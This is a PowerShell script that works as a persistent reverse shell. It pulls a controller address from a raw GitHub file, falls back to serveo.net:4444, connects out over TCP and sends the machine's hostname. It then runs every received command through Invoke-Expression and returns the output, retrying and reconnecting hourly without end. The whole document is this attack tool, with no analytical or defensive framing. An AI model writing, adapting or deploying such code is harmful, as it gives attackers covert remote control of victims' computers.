function Get-DynamicServeoAddress {
    $githubUrl = "https://raw.githubusercontent.com/nkt420/winstf/main/hip.txt"
    try {
        # Get the Serveo address (e.g., serveo.net:4444) from the remote file
        $serveoAddress = Invoke-RestMethod -Uri $githubUrl -UseBasicParsing
        return $serveoAddress
    } catch {
        # Fallback to a default Serveo address if the request fails
        Write-Host "Failed to retrieve Serveo address. Using fallback."
        return "serveo.net:4444"
    }
}

function Start-ReverseShell {
    param (
        [string]$serveoAddress
    )

    try {
        # Split the Serveo address into IP (or domain) and port
        $addressParts = $serveoAddress -split ':'
        $ipAddress = $addressParts[0]
        $port = [int]$addressParts[1]

        # Establish a TCP connection to Serveo
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect($ipAddress, $port)

        if ($client.Connected) {
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $buffer = New-Object System.Byte[] 1024
            $hostname = [System.Net.Dns]::GetHostName()
            $writer.WriteLine("Connected from $hostname")

            while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $data = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead).Trim()

                if ($data -eq "exit") {
                    break
                }

                try {
                    $output = Invoke-Expression $data 2>&1
                    if ($output) {
                        $writer.WriteLine($output)
                    }
                } catch {
                    $writer.WriteLine("Error executing command: $_")
                }
            }
            $client.Close()
        } else {
            throw "Connection failed to $ipAddress:$port"
        }
    } catch {
        Write-Host "Failed to connect to $serveoAddress. Error: $_"
    }
}

function Main {
    while ($true) {
        try {
            # Retrieve the Serveo address dynamically
            $serveoAddress = Get-DynamicServeoAddress
            Write-Host "Retrieved Serveo Address: $serveoAddress"
            $connected = $false
            $retryAttempts = 5

            for ($i = 1; $i -le $retryAttempts; $i++) {
                Write-Host "Attempting connection (Attempt $i/$retryAttempts)..."
                Start-ReverseShell -serveoAddress $serveoAddress

                if ($client.Connected) {
                    $connected = $true
                    break
                } else {
                    Write-Host "Connection failed. Retrying in 30 seconds..."
                    Start-Sleep -Seconds 30
                }
            }

            if (-not $connected) {
                Write-Host "Unable to connect after $retryAttempts attempts."
            }

        } catch {
            Write-Host "Error in Main loop: $_"
        }

        Start-Sleep -Seconds 3600
    }
}

Main
